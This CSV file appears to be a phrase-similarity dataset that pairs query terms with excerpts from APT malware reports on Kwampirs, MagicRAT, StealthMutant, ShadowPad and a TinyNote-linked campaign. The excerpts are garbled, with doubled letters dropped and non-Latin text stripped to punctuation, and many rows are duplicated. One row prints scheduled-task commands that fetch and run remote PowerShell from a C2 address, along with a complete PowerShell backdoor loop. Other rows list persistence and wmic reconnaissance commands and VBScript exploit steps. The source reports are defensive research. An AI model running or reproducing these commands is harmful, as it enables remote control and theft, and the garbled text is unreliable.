hash,phrase,similarity,adjacent_sentences
d5019121cbc645eb0787efab173a12b3,WMIC,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,WMIC,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,WMIC,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,WMIC,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,WMIC,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
08a0ccc49008dbbf532b22d39ac2b886,delete important files,0.7862749096211298,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
fd1e2466e0c27de5905c2d67061cd76f,upload/download file,0.793860001801613,"['Reflective and object file loader.', 'Decoding KRB5 ticket and converting it to hashcat.', 'Patching Event Tracing for Windows (ETW).', 'Patching Anti Malware Scan Interface (AMSI).', 'Create Windows system services.', 'Upload and download files.', 'Create files via CreateFileTransacted.', 'Port scan.', 'From Click to Brute Figure 4.', 'VirusTotal verdicts for sample as of June 27, 202.', 'The file in VirusTotal named Roshan_CV.iso (SHA256: 1FC7B0E1054D54CE8F1DE0C95976081C7A85C7926C03172A3DA67269042C) apears to be a curiculum 4/17 vitae (similar to a resume) of an individual named Roshan.']"
564c219dc0a2c3edd2eed08025387d9d,upload/download file,0.811666429623082,"['comand codes in the MargualsRAT indicating that this RAT is actively in development by the atackers.', 'ALAKORE Alakore is a publicly available Delphi- based RAT that has consistently ben used in SideCopy operations along with CetaRAT.', 'Malicious capabilities of Alakore include: Keyloging.', 'Capture screnshots.', 'List folders and files.', 'Upload/Download files.', 'Steal clipboard data.', 'Grab/change walpaper.', 'In recent infections, this RAT is named Cyrus client (Figure 16).', 'ACTIONRAT ActionRAT is a Delphi-based RAT Figure 15: Comand handler of MargulasRAT.', 'containing a limited set of capabilities.']"
c535fe3c1b9e7485ff2a5fa8766d741b,the decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
c535fe3c1b9e7485ff2a5fa8766d741b,the decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
b5d067b705e3d7716dc5cd360e61cc7d,to decrypt the payload,0.770388922287375,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
b5d067b705e3d7716dc5cd360e61cc7d,decrypt it,0.8988606746601266,"['The execution of StealthMutant through InstalUtil.exe InstalUtil.exe is a legitimate instaler aplication under Microsofts .NET Framework, but it is also known as a living-of-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstalUtil.exe is registered to run StealthMutant, as demonstrated in Figure 1.', 'Figure 1.', 'InstalUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Technical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shelcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shelcode loader writen in C# that has ben in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote proces, and then executes it.', 'We have observed that its payload has ben either the Cobalt Strike beacon or the ScrambleCros backdor.', 'Most of the StealthMutant samples we have come acros are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework aplications.', 'After deobfuscating these samples, we have observed raw namespaces and clases that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
2f9cb1419d88d162b0fe29430bf53db3,"API obfuscation, and execution flow obfuscation",0.7891020997535929,"['ESET Research White papers / July 2019 MACHETE JUST GOT SHARPER Venezuelan military under atack How spies managed to steal gigabytes of confidential data over the course of a year TABLE OF CONTENTS 1.', 'Introduction .', '.', '.', '.', '.', '.', '.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
54739c05e5c102ca2f434bf7436f19fa,proxy,0.7810083562863923,"['Securelist.', 'August 2015. can even be such a thing.', 'In a hypothetical scenario where we htps:/securelist.com/blog/research/71713/darkhotels- have packets captured en route (as in the comon jab PCAP or atacks-in-2015/.', 'GTFO), could it not be a backdored system being used to [2] Schneier, B.', 'Simultaneous Discovery of Vulnerabilities.', 'proxy through?', 'Where we catch a nation-state operator Schneier on Security.', 'February 2016. red-handed, would we not ned an understanding of the htps:/w.schneier.com/blog/archives/2016/02/ provenance of their tasking?', 'More realisticaly, there wil never simultaneous_di.html.', 'be a solid enough atribution claim for everyone to get behind.', 'Rather, the combination of multiple indicators helps an analyst [3] Equation Group: Questions and Answers.']"
937553fb8e3ba631cb28165aa71a66da,proxy,0.7569189103367252,"['File might have random apended data (Depends on the configs 0x92 flag at ofset 0x326).', '0xA0 Loaders filepath Table 2 Shadowpad Data Types 3/12 Once one of the above bytes are located, ShadowPad reads the data (size is defined before the byte identifier) and apends the last DWORD value to the hardcoded byte aray 1A915B2D21384C6DA3C21FCA5201A4.', 'Then it hashes (MD5) the constructed byte aray and derives an AES-CBC 128bits key and decrypts the data.', 'In adition, ShadowPad stores, in an encrypted format, the folowing data in the registry with the registry key name being unique (based on volume serial number of C:\\) for each compromised host: 1.', 'ShadowPad configuration (0x80) data.', '2.', 'Proxy configuration.', 'Includes proxy information that ShadowPad requires.', 'These are the network comunication protocol, domain/IP proxy and the proxy port.', '3.', 'Downloaded modules.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
9cd7c673b04415e320b2ceea1c818934,proxy,0.7691225825819927,"['Wel-trained and ready users, informed with the latest threat inteligence on adversary activity, are the first line of defense.', '3.', 'End User Device Security.', 'Adaptable endpoint security is critical to stoping this type of atack early, especialy for users working from home and not behind the enterprise web proxy or other layered defensive capability.', 'Stoping or detecting the first two stages of infection requires an endpoint security capability of identifying file-les malware, particularly malicious Ofice documents and persistence techniques that leverage start-up folder modification.', '4.', 'Web Proxy.', 'A secure web gateway is an esential part of enterprise security architecture and, in this scenario, can restrict aces to malicious web sites and block aces to the comand and control sites.', '5.', 'Sec Ops Endpoint Detection and Response (EDR) can be used to detect techniques most likely in stages 1, 2 or 4.', 'Aditionaly, EDR can be used to search for the initial documents and other indicators provided through threat analysis.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,Windows API,0.7851647481362197,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
62589cf5643f8cfe04ac39602119309c,Windows API,0.7851647481362197,"['2. id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 3589"", ""Last Ad rub 67"" ] } 1. : {ip}:9850/api/rubriclist?Parent=-1 / {ip}:9850/api/rubriclist?Parent=20 / Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": nul, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25 },. ]', ': Url=""/json/rubrics/5 2. : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""A"", ""Name"": ""A-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },. ]', 'API .', '.', ', .', '.', '- .', '26 - , (), (), ().', '- .']"
57c72cba1b008593ba3d60f214807584,Windows API,0.7851647481362197,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
7fd321bf3d665b1e21967c3a8052d876,Windows API,0.7851647481362197,"['Initializing module poisonivy_23x Transfered files wil be saved.', 'Scren/Cam/Audio/Key captures wil be saved.', 'Runing Modules .', '[2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]* Host Information* PI profile ID: mal IP adres: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 260 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] * Shel Sesion * Microsoft Windows XP [Version 5.1.260] (C) Copyright 1985-201 Microsoft Corp. C:\\> [2013-07-03 06:46:42 PDT] * Shel Sesion * ipconfig [2013-07-03 06:46:43 PDT] * Shel Sesion * Windows IP Configuration Conection-specific DNS Sufix .', ': IP Adres.', '.', '.', '.', '.', '.', '.']"
22a069efb6997235b32a9c908f7b7300,"the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f",0.8779803971078495,"['If this is not found, it continues the execution flow.', 'First, it creates the directory c:\\programdata\\Robots.', 'If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.', 'Next, the malware creates 2 scheduled tasks caled test and test2 to retrieve and execute PowerShel comands, each retrieved from robots.txt from diferent C&C servers, most likely to eliminate a single point of failure: schtasks /Create /TN test /SC MINUTE /MO 15 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/5.18.3.190/Robots.txt\\"");(new- object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f schtasks /Create /TN test2 /SC MINUTE /MO 45 /TR ""powershel \\""$r= [System.Net.WebRequest]:Create(\\""htp:/103.159.132.91/Robots.txt\\""); (new-object System.IO.StreamReader($r.GetResponse().GetResponseStream().ReadToEnd() | powershel.exe -noprofile -\\"" /f At the time of execution, both servers returned the same code pointing to the third server: C:\\Windows\\System32\\cmd.exe /c ""start powershel.exe -nop -c set-alias exi iex;`$v1=\'iex (new-object net.webclient).dow\';`$v2=\'nloadstring(\'htp:/\';`$v3=\'103.159.132.91/robots1.txt\')\';exi(`$v1+ The final payload returned is a lightweight PowerShel backdor, which retrieves a list of comands from the CMD header from the C&C server response, executes them with Invoke-Expresion, concatenates the outputs with \'_n1w_\' string, and sends them back to the server in POST request: $WindowState = \'[DlImport(""user32.dl"")] public static extern bol ShowWindow(int handle, int stat);\';ad-type -name win -member $WindowState - namespace native; [native.win]:ShowWindow([System.Diagnostics.Proces]:GetCurentProces() | Get-Proces).MainWindowHandle, 0); $url=""htp:/103.159.132.91:8081/""; $postParams = \'result=start\'; while (1 -eq 1) { try { $data = [System.Text.Encoding]:UTF8.GetBytes($postParams); $req = [System.Net.WebRequest]:Create($url); $req.ServicePoint.ConectionLimit =6535; If ($req.ServicePoint.CurentConections -ge 10) { $req.ServicePoint.CloseConectionGroup("") } $req.ServicePoint.Expect10Continue = $false; #$req.Timeout = 10; $req.Method = ""POST""; $req.ContentType = ""aplication/x-w-form-urlencoded""; $req.ContentLength = $data.Length; $Stream = $req.GetRequestStream(); $Stream.Write($data, 0, $data.Length);$Stream.Flush();$Stream.Close(); #waiting remote [System.Net.WebResponse] $resp = $req.GetResponse();$header=$resp.GetResponseHeader(\'CMD\'); $d = [System.Convert]:FromBase64String($header); $Ds = [System.Text.Encoding]:UTF8.GetString($d);$result = ""; Foreach ($string in invoke-expresion $Ds) {$result=$result+\'_n1w_\'+$string;}; $result = [Convert]:ToBase64String([System.Text.Encoding]:UTF8.GetBytes($result); $postParams = ""result=$result""; } 4/6 catch{}; }; The malware then copies itself to the zip file with the name [16 random characters].zip in c:\\users\\public\\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\\users\\public\\pMiOxI3G4Igrpq7.zip\\.', 'Both the file inside the zip and the unziped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe.', 'Finaly, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\\users\\public\\8NaZrCq3pGeDRXKF.zip\\8NaZr.exe"" /f Second mode: the backdor This mode hapens after the malware has achieved persistence and is runing from a zip path.', 'First, the malware enumerates the system for the folowing data and concatenates it to one string: The curent system username The curent username home folder The systems network interfaces (name, MacAdres, description) Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.', 'It then picks one random C&C URL out of the thre available and constructs a GET request: htp:/5.18.3.190/api.php htp:/103.169.90.132/api.php htp:/103.159.132.91/api.php The encoded enumeration data is stored in a cokie caled SN.', 'Other headers in the request are constructed from serval random values.', 'The hostname header is selected from the folowing list: The user-agent is also randomized and is selected from the folowing list: Mozila/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/2010101 Firefox/103.0 Mozila/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) ApleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1 Mozila/5.0 (X1; Ubuntu; Linux x86_64; rv:63.0) Gecko/2010101 Firefox/63.0 Mozila/5.0 (Windows NT 10.0; Win64; x64) ApleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 The expected result from the server is a JSON with the folowing structure: {""msg"":""[BASE64-ENCODED COMAND]""} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the comand and continues to listen for more comands in a lop.', 'Atribution In adition to the fact that one of the backdor versions was found on the Camaro Dragon distribution server, there are other strong conections betwen the actors and the TinyNote malware: The server 103.159.132[.']"
73ae3d11837c3f9dbcfc8f41544bb20e,ipconfig,0.80966835917559,"[' .', '2017.', '2 0 1 7.', '- (Ii -) .46535.I5 3 474 2 0 1 7.', '2017 1 3 1.1 .3 1.2 .3 1.3 .3 1.4 .5 1.5 , , , , .25 1.6 - .30 1.7 .31 1.8 .31 1.9 .31 32 314 320 2 1 1.1 1.1.1 ( ) () - RU.0176-01 ( ), , - () .', '1.2 1.2.1 - () - 1 , - .']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,they also used tasklist,0.7743869862312265,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
d5019121cbc645eb0787efab173a12b3,wmic,0.7832871736269563,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
949b57ffdfcc42e1765f65e65995733b,wmic,0.862634642643921,[]
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
